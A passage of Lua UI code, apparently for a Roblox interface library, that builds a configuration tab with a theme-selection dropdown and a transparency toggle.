    Duration = 5,
})

for Name, Theme in pairs(Window:GetThemes()) do
    table.insert(themeValues, Name)
end

local themeDropdown = configurationTab:Dropdown({
    Title = "Select theme",
    Multi = false,
    Value = "Dark",
    AllowNone = false,
    Values = themeValues,
    Callback = function(Tab)
        Window:SetTheme(Tab)
    end
})

local toggleTransparencyButton = configurationTab:Toggle({
    Title = "Toggle Transparency",
    Callback = function(e)
        Window:ToggleTransparency(e)
    end
})
